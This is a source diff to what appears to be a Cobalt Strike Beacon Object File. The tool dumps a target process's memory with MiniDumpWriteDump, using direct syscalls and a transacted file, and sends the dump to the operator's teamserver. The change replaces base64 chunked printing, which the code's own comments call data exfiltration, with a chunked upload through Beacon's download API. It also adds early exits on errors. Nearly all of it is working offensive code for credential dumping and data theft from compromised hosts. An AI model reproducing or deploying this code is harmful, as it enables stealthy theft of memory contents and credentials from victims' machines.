@@ -6,49 +6,137 @@
 #include "syscalls.h"
 #include "beacon.h"
 
-//Base64 encode
-char* base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
- 
-    static char encoding_table[] = {
-                                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
-                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
-                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
-                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
-                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
-                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
-                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
-                                '4', '5', '6', '7', '8', '9', '+', '/'
-                                };
+/*Download File*/
+void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
 
-static int mod_table[] = { 0, 2, 1 };
+    //Intializes random number generator to create fileId 
+    time_t t;
+    MSVCRT$srand((unsigned)MSVCRT$time(&t));
+    int fileId = MSVCRT$rand();
 
-    *output_length = 4 * ((input_length + 2) / 3);
+    //8 bytes for fileId and fileSize
+    int messageLength = downloadFileNameLength + 8;
+    char* packedData = (char*)MSVCRT$malloc(messageLength);
  
-    char *encoded_data = MSVCRT$malloc(*output_length);
-    if (encoded_data == NULL) return NULL;
- 
-    for (int i = 0, j = 0; i < input_length;) {
-        
-        unsigned int octet_a = i < input_length ? (unsigned char)data[i++] : 0;
-        unsigned int octet_b = i < input_length ? (unsigned char)data[i++] : 0;
-        unsigned int octet_c = i < input_length ? (unsigned char)data[i++] : 0;
- 
-        unsigned int triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
- 
-        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
-        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
-        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
-        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
+    //pack on fileId as 4-byte int first
+    packedData[0] = (fileId >> 24) & 0xFF;
+    packedData[1] = (fileId >> 16) & 0xFF;
+    packedData[2] = (fileId >> 8) & 0xFF;
+    packedData[3] = fileId & 0xFF;
+
+    //pack on fileSize as 4-byte int second
+    packedData[4] = (fileSize >> 24) & 0xFF;
+    packedData[5] = (fileSize >> 16) & 0xFF;
+    packedData[6] = (fileSize >> 8) & 0xFF;
+    packedData[7] = fileSize & 0xFF;
+
+    int packedIndex = 8;
+
+    //pack on the file name last
+    for (int i = 0; i < downloadFileNameLength; i++) {
+        packedData[packedIndex] = fileName[i];
+        packedIndex++;
     }
- 
-    for (int i = 0; i < mod_table[input_length % 3]; i++)
-        encoded_data[*output_length - 1 - i] = '=';
- 
-    return encoded_data;
-}
+
+     BeaconOutput(CALLBACK_FILE, packedData, messageLength);
+
+    if (fileSize > (1024 * 900)){
+      
+      //Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
+      int numOfChunks = (fileSize / (1024 * 900)) + 1;
+      int index = 0;
+      int chunkSize = 1024 * 900;
+
+      while(index < fileSize) {
+        if (fileSize - index > chunkSize){//We have plenty of room, grab the chunk and move on
+            
+            /*First 4 are the fileId 
+	    then account for length of file
+	    then a byte for the good-measure null byte to be included
+            then lastly is the 4-byte int of the fileSize*/
+            int chunkLength = 4 + chunkSize;
+            char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
+            
+            //pack on fileId as 4-byte int first
+            packedChunk[0] = (fileId >> 24) & 0xFF;
+            packedChunk[1] = (fileId >> 16) & 0xFF;
+            packedChunk[2] = (fileId >> 8) & 0xFF;
+            packedChunk[3] = fileId & 0xFF;
+
+            int chunkIndex = 4;
+
+            //pack on the file name last
+            for (int i = index; i < index + chunkSize; i++) {
+                packedChunk[chunkIndex] = returnData[i];
+                chunkIndex++;
+            }
+
+	     BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+
+        } else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
+           
+	    int lastChunkLength = fileSize - index + 4;
+            char* lastChunk = (char*) MSVCRT$malloc(lastChunkLength);
+            
+	    //pack on fileId as 4-byte int first
+            lastChunk[0] = (fileId >> 24) & 0xFF;
+            lastChunk[1] = (fileId >> 16) & 0xFF;
+            lastChunk[2] = (fileId >> 8) & 0xFF;
+            lastChunk[3] = fileId & 0xFF;
+            int lastChunkIndex = 4;
+            
+	    //pack on the file name last
+            for (int i = index; i < fileSize; i++) {
+                lastChunk[lastChunkIndex] = returnData[i];
+                lastChunkIndex++;
+            }
+		BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
+        }
+        
+	index = index + chunkSize;
+
+      }
+
+    } else {
+
+        /*first 4 are the fileId
+        then account for length of file
+        then a byte for the good-measure null byte to be included
+        then lastly is the 4-byte int of the fileSize*/
+        int chunkLength = 4 + fileSize;
+        char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
+        
+        //pack on fileId as 4-byte int first
+        packedChunk[0] = (fileId >> 24) & 0xFF;
+        packedChunk[1] = (fileId >> 16) & 0xFF;
+        packedChunk[2] = (fileId >> 8) & 0xFF;
+        packedChunk[3] = fileId & 0xFF;
+        int chunkIndex = 4;
+
+        //pack on the file name last
+        for (int i = 0; i < fileSize; i++) {
+            packedChunk[chunkIndex] = returnData[i];
+            chunkIndex++;
+        }
+	
+        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+    }
+
+
+    //We need to tell the teamserver that we are done writing to this fileId
+    char packedClose[4];
+    
+    //pack on fileId as 4-byte int first
+    packedClose[0] = (fileId >> 24) & 0xFF;
+    packedClose[1] = (fileId >> 16) & 0xFF;
+    packedClose[2] = (fileId >> 8) & 0xFF;
+    packedClose[3] = fileId & 0xFF;
+    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
+
+    return; 
+}   
 
 /*Begin MiniDumpWriteDump reactOS Code*/
-
 static BOOL fetch_process_info(struct dump_context* dc)
 {
     ULONG       buf_size = 0x1000;
@@ -610,6 +698,7 @@ void go(char* args, int length) {
 	BeaconDataParse(&parser, args, length);
 	PID = BeaconDataInt(&parser);
 	outputFile = BeaconDataExtract(&parser, NULL);
+        int outputFileLength = BeaconDataInt(&parser);
 	
 	//Declare variables
 	void* returnData = NULL;
@@ -642,11 +731,12 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_ERROR, "[-] NtOpenProcess failed with status %lx\n", status);
+	        return;
 	}
 	else {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtOpenProcess returned HANDLE 0x%p\n", hProc);
-	
+    }	
 
 	//Create Transaction
 	status = NtCreateTransaction(&tFile, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
@@ -654,6 +744,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateTransaction failed with status %lx\n", status);
+	        return;
 	}
 	else {
 
@@ -666,6 +757,7 @@ void go(char* args, int length) {
 	if (status != 1) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] RtlSetCurrentTransaction failed with status %lx\n", status);
+		return;
 	}
 	else {
 
@@ -688,6 +780,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateFile failed with status %lx\n", status);
+		return;
 	}
 	else {
 		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtCreateFile returned HANDLE 0x%p\n", hFile);
@@ -699,6 +792,7 @@ void go(char* args, int length) {
 	if (status != 1) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] RtlSetCurrentTransaction failed with status %lx\n", status);
+	        return;
 	}
 	else {
 
@@ -710,6 +804,7 @@ void go(char* args, int length) {
 		
 	if (success = 0) {
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] MiniDump failed.  GetLastError = (%ld)\n", KERNEL32$GetLastError());
+		return;
 	}
 	else
 	{
@@ -728,6 +823,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateSection failed with status %lx\n", status);
+		return;
 	}
 	else {
 	
@@ -739,6 +835,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtMapViewOfSection failed with status %lx\n", status);
+		return;
 	}
 	else {
 
@@ -746,132 +843,31 @@ void go(char* args, int length) {
 
 	}
 	
-	/*Note: At this point returnData holds our memory dump -> You could choose to encrypt it, compress it, write it to disk somwhere, whatever.  You do you*/
+	/*Note: At this point returnData holds our memory dump -> You could choose to encrypt it, compress it, write it to disk somwhere, whatever.  You do you but we are going to download it via beacons native download API*/
 
-	//Base64 our MiniDump
-	size_t outputLength = 0;
-	char* base64returnDataString = base64_encode(returnData, fileSize, &outputLength);
-	BeaconPrintf(CALLBACK_OUTPUT, "[+] Base64 Length In Bytes = %d\n", outputLength);
-	void* baseAddress = (void*)base64returnDataString;
-	
-	/*Note: At this point base64returnDataString also holds our now base64 memory dump and I have added code to optionally write to disk -> Again, like mentioned above you could do whatever after this, for example skip the BeaconPrintf POC and send out via different comms method*/
-	
-	if (MSVCRT$strcmp(outputFile,"")  != 0) {
-	
-	//Create a file on disk and write our buffer to path operator chose
-	DWORD bytesWritten = 0;
-	HANDLE writeFile = KERNEL32$CreateFileA(outputFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	success = KERNEL32$WriteFile(writeFile, base64returnDataString, (DWORD)outputLength, &bytesWritten, NULL);
-		if (success != 0) {
-		
-			BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing file was successful\n");
-		}
-		else
-		{
-			BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteFile failed with GetLastError = (%ld)\n", KERNEL32$GetLastError());
-		}
-		
-		//close handle
-		status = NtClose(writeFile);
-	}
-	else
-	{
-	
-	//Chunk the data and send it back to team server -> Probably a beter way ¯\_(ツ)_/¯
-    	size_t size = 1021;
-	char* toSend = (char*)intAlloc(size);
-    	ULONG CurLen = 0;
-    	ULONG ChkLen = 1020;
-	MSVCRT$memset(toSend, 0, size);
-	
-	//If larger than 100 MB we are going to split in half plus slow our roll a bit to help make sure we get the entire dump back and our beacon doesn't die 
-	//Note: If you wanted to be really safe, you could split the data into 100 MB chunks.  This way if your dump file is for example 400MB you can manage it easier with less risk of losing your beacon.
-	if (outputLength > 100000000) {
-	
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump larger than 100 MB. Going to chunk and start sending half\n");
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] Then sleep for 3 minutes so CS can catch up and send last half...\n");
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] Data Exfiltration Will Take Several Minutes So Be Patient...\n");
-		
-		//Check if outputLength is odd or even and if odd make even to easily split in half
-		BOOL isOdd = 0;
-		if ( outputLength%2 != 0 ) {
-		
-		outputLength = outputLength + 1;
-		isOdd = 1;
-		}
-		
-		//Split outputLength in half
-		int splitOutputLength = outputLength / 2;
-		
-		//If output was originally even
-		if ( isOdd != 1 ) {
-		
-			//Send first half
-			for (; ((splitOutputLength - CurLen) - ChkLen) >= 0 && CurLen < splitOutputLength; CurLen += ChkLen) {
-			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
-			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
-			MSVCRT$memset(toSend, 0, size);
-			base64returnDataString = (char*)base64returnDataString + ChkLen;
-    			};
-    			
-    			//Sleep 3 min and let CS catch up
-    			KERNEL32$Sleep (180000);
-    			
-    			//Send second half
-    			for (; ((outputLength - CurLen) - ChkLen) >= 0 && CurLen < outputLength; CurLen += ChkLen) {
-			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
-			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
-			MSVCRT$memset(toSend, 0, size);
-			base64returnDataString = (char*)base64returnDataString + ChkLen;
-    			};
-    			
-		}
-		else
-		{
-		
-			outputLength = outputLength - 1;
-			
-			//Send first half
-			for (; ((splitOutputLength - CurLen) - ChkLen) >= 0 && CurLen < splitOutputLength; CurLen += ChkLen) {
-			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
-			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
-			MSVCRT$memset(toSend, 0, size);
-			base64returnDataString = (char*)base64returnDataString + ChkLen;
-    			};
-    			
-    			//Sleep 3 min and let CS catch up
-    			KERNEL32$Sleep (180000);
-    		
-    			//Send second half
-    			for (; ((outputLength - CurLen) - ChkLen) >= 0 && CurLen < outputLength; CurLen += ChkLen) {
-			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
-			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
-			MSVCRT$memset(toSend, 0, size);
-			base64returnDataString = (char*)base64returnDataString + ChkLen;
-    			};
-    		}
-	}
-	else
-	{	
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] Data Exfiltration might Take A Few Minutes So Be Patient...\n");
-		//Less than 100 MB so we just send the whole dump file
-    		for (; ((outputLength - CurLen) - ChkLen) >= 0 && CurLen < outputLength; CurLen += ChkLen) {
-		MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
-		BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
-		MSVCRT$memset(toSend, 0, size);
-		base64returnDataString = (char*)base64returnDataString + ChkLen;
-    		};
-	}
-	}
-	
-	BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump completed\n");
-	
-	 //Close Handles
-        status = NtClose(hProc);
-        status = NtClose(tFile);
-        status = NtClose(hFile);
-	
-	//Free memory
-	MSVCRT$free(baseAddress);
-	}
+    //If no output name is provided, the format will be "Mem:\[pid].dmp"
+    int downloadFileNameLength;
+    char* fileName;
+  
+    if(!outputFile) {
+        //No name was provided, so we will use the pid as the basename
+        downloadFileNameLength = MSVCRT$_snprintf(NULL,0,"%i",PID) + 9;
+        fileName = (char*) MSVCRT$malloc(downloadFileNameLength);
+        MSVCRT$sprintf(fileName, "mem:\\%d.dmp", PID);
+    } else {
+        //User provided a name to use for output
+        downloadFileNameLength = outputFileLength + 9;
+        fileName = (char*) MSVCRT$malloc(downloadFileNameLength);
+        MSVCRT$sprintf(fileName, "mem:\\%s.dmp", outputFile);
+    }
+
+    //Download memory dump
+    downloadFile(fileName, downloadFileNameLength, returnData, fileSize);
+
+    //Close Handles
+    status = NtClose(hProc);
+    status = NtClose(tFile);
+    status = NtClose(hFile);
+    
+    return;
 }
